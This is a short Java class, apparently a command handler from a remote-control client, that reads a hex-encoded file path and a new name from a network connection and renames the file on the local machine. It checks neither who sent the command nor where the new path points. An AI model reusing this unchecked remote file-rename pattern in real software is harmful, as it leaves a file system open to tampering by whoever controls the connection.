package com.redpois0n.packets;

import java.io.File;

import com.redpois0n.Connection;
import com.redpois0n.common.codec.Hex;


public class PacketRNTO extends Packet {
	
	public void read(String line) throws Exception {
		String file = Connection.readLine();
		String newname = Connection.readLine();

		File f = new File(Hex.decode(file.substring(2, file.length())));
		File fto = new File(f.getAbsolutePath().replace(f.getName(), "") + newname);
		if (f.exists()) {
			f.renameTo(fto);
		}
	}

}
